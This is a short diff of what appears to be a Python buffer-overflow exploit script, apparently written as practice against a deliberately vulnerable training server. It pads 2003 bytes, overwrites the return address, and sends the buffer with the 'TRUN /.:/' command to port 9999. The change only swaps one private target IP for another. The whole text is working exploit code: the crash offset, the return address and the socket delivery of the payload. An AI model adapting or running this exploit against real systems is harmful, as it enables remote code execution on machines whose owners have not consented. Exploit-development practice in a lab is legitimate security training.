@@ -8,7 +8,7 @@ shellcode = "A" * 2003 + "\xaf\x11\x50\x62" # x86 architecture, little endian
 
 try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(('192.168.4.104',9999))
+	s.connect(('192.168.1.101',9999))
 
 	payload = "TRUN /.:/" + shellcode
 
